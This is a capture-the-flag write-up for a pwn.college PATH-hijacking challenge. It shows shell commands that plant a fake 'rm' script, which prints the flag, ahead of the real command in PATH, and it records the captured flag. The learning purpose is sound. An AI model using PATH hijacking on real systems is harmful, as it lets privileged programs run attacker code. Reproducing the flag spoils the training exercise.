# Hijacking Commands
My task is to stop /challenge/run from deleting the flag by hijacking the rm command. I'll create my own harmless script, name it rm, and place it in a new directory.
Then, I'll prepend this directory to the beginning of my PATH variable so that my fake rm gets executed instead of the real one, saving the flag.

## My solve
**Flag:** `pwn.college{QKYs7w1HbdDOcMC4dm9IJZH2WQw.QX3cjM1wiN4AzNzEzW}`

```
hacker@path~hijacking-commands:~$ mkdir ~/fake_commands
hacker@path~hijacking-commands:~$ echo -e '#!/bin/bash\ncat /flag' > ~/fake_commands/rm
hacker@path~hijacking-commands:~$ export PATH="$HOME/fake_commands:$PATH"
/challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/fake_commands/rm. Executing!
pwn.college{QKYs7w1HbdDOcMC4dm9IJZH2WQw.QX3cjM1wiN4AzNzEzW}
```

## What I learned
I learned how to perform a PATH hijacking attack. Since the shell searches PATH directories in order, I can create a fake command (like a harmless rm script) and put its directory at the front of the PATH. 
This tricks the system into running my script instead of the real command, giving me control over its execution.

## References 
I used the resources available on pwn.college as references.
